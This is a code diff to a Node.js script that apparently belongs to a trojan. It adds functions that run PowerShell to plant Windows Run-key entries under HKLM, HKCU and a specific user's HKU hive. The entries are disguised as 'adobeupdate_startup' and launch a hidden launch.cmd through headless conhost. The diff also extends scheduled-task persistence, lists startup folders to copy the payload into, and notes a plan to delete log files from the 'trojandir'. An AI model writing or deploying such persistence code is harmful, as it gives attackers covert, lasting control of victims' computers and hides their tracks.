@@ -77,7 +77,15 @@ for (let token of process.argv) {
     if (!token.includes("--inspect-brk")) process_argv.push(token);
 }
 
+// TODO: put in time parameter
 var taskconfig = {
+    tasks: [
+        { 'name':'IdleTask', 'enabled': false },
+        { 'name':'RepTask', 'enabled': false },
+        { 'name':'TimeTask', 'enabled': false },
+        { 'name':'DailyTask', 'enabled':false }
+    ],
+
     get tasknames() {
         return Object.keys(this.taskxmlfuncs);
     },
@@ -88,6 +96,67 @@ var taskconfig = {
         TimeTask: getTimeTaskXMLStr,
         DailyTask: getDailyTaskXMLStr,
     },
+};
+
+var startupfolderconfig = {
+
+};
+
+var regstartupconfig = {
+
+    startup_name: '', 
+    startup_value: '',
+
+    get name_value_str() {
+        return `$Name = "${startup_name}"
+                $Value = "${startup_value}"` + '\r\n';
+    },
+
+    get new_item_str() {
+        return "New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType String -Force";
+    },
+
+    get hku_path() {
+        return "HKU:\\S-1-5-21-3405768669-439801778-3591577900-24511\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+    },
+
+    get hklm_path() {
+        return "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+    },
+
+    get hkcu_path() {
+        return "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    },
+
+    get startup_hklm_script() {
+        return this.name_value_str + '\r\n' + `$RegistryPath = "${this.hklm_path}"` + '\r\n' + this.new_item_str;
+    },
+
+    get startup_hkcu_script() {
+        return this.name_value_str + '\r\n' + `$RegistryPath = "${this.hkcu_path}"` + '\r\n' + this.new_item_str;
+    },
+
+    get startup_hku_script() {
+        let new_drive_tag = `New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS`;
+        return new_drive_tag + '\r\n' + this.name_value_str + '\r\n' + `$RegistryPath = "${this.hku_path}"` + '\r\n' + this.new_item_str;
+    }
+};
+
+// TODO: folder name + enabled
+var startupfolderconfig = {
+    
+    folders: [
+        { name:'folder_001', enabled: true },
+        { name:'folder_002', enabled: true },
+        { name:'folder_003', enabled: true }
+    ],
+
+    folderpaths: {
+        'folder_001':'C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
+        'folder_002':'C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
+        'folder_003':'C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' 
+    }
+
 };
 
 var systemstate = {
@@ -2682,65 +2751,68 @@ async function reschedule() {
     }
 }
 
-// TODO
-// anchor
-async function add_reg(ppath, pvalue, ptype, pdata) {
-    logmsg(`starting`);
+async function exec_ps_cmd(cmdstr) {
+    if ( isNullOrWhitespace(cmdstr) )
+        return;
 
-    let args = ["add", ppath];
+    cmdstr = cmdstr.replace(/\r?\n/g, ';');
 
-    if (!isNullOrWhitespace(pvalue)) {
-        args.push("/v", pvalue);
-    }
+    return new Promise((resolve, reject) => {
 
-    if (!isNullOrWhitespace(ptype)) {
-        args.push("/t", ptype);
-    }
+        exec(
+            `powershell.exe -NoProfile -Command "${cmdstr}"`,
+            { maxBuffer: 1024 * 1024 * 10 },
+            (error, stdout, stderr) => {
+                if (error) {
+                    reject(error);
+                }
 
-    if (!isNullOrWhitespace(pdata)) {
-        args.push("/d", pdata);
-    }
+                if (stderr) {
+                    resolve(stderr);
+                }
 
-    args.push("/f");
+                resolve(stdout);
+            }
+        );
 
-    let ret = await invoke_exe("reg", args);
+    });
 }
 
-// TODO
+async function penetrate_reg() {
+    regstartupconfig.startup_name = 'adobeupdate_startup';
+
+    regstartupconfig.startup_value = 'conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd startup_hklm';
+    await exec_ps_cmd(regstartupconfig.startup_hklm_script);
+
+    regstartupconfig.startup_value = 'conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd startup_hkcu'; 
+    await exec_ps_cmd(regstartupconfig.startup_hkcu_script);
+
+    regstartupconfig.startup_value = 'conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd startup_hku';
+    await exec_ps_cmd(regstartupconfig.startup_hku_script);
+
+    return;
+}
+
+async function penetrate_folders() {
+    // create and copy startup_launch.cmd into folders
+    // conhost.exe --headless C:\ProgramData\owd\launch.cmd startup_allusers, startup_profile, startup_adult2022
+    /*
+    C:\Users\All Users\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
+    C:\ProgramData\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    C:\Users\ADULT2022\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
+    */
+}
+
 async function penetrate() {
     logmsg("starting");
 
-    await reschedule();
+    await reschedule(); // tasks
 
-    await add_reg(
-        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-        tskname,
-        "REG_SZ",
-        "launc.cmd"
-    );
+    await penetrate_reg(); // registry
 
-    // cleanup
-    // copy exe/scripts to startup folders
+    await penetrate_folders(); // startup folders
 
-    /*    
-cmdstr = ""
-cmdstr = "REG ADD " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq 
-cmdstr = cmdstr & " /v " & tskname & " /t REG_SZ /d " & exepath & " /f"
-
-Call RunShell("cmd /c " & cmdstr, True)
-
-// https://helgeklein.com/blog/active-setup-explained/
-Dim regpath : regpath = dq & "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & tskname & dq
-
-cmdstr = "REG ADD " & regpath & " /f"
-Call RunShell(cmdstr, True)
-
-cmdstr = "REG ADD " & regpath & " /v " & dq & "StubPath" & dq & " /d " & dq & exepath & dq & " /t REG_SZ /f"
-Call RunShell(cmdstr, True)
-
-cmdstr = "REG ADD " & regpath & " /v " & dq & "Version" & dq & " /d " & dq & "1" & dq & " /t REG_SZ /f"
-Call RunShell(cmdstr, True)
-*/
+    // TODO await cleanup() // check if trojandir needs cleanup, if so remove log files, etc.
 
     logmsg("finished");
     process.exit(0);
@@ -3598,7 +3670,7 @@ async function createTask(taskname) {
     let taskxmlstrfunc = taskconfig["taskxmlfuncs"][taskname];
 
     let pexe = "conhost.exe";
-    let args = "--headless C:\\ProgramData\\owd\\launch.cmd";
+    let args = `--headless C:\\ProgramData\\owd\\launch.cmd ${taskname}`;
     let workdir = "C:\\ProgramData\\owd\\";
 
     let tasktime = ["RepTask", "TimeTask"].includes(taskname) ? "1" : "5";
@@ -3901,6 +3973,7 @@ function getDailyTaskXMLStr(
 
     return taskxmlstr;
 }
+
 
 // ---
 
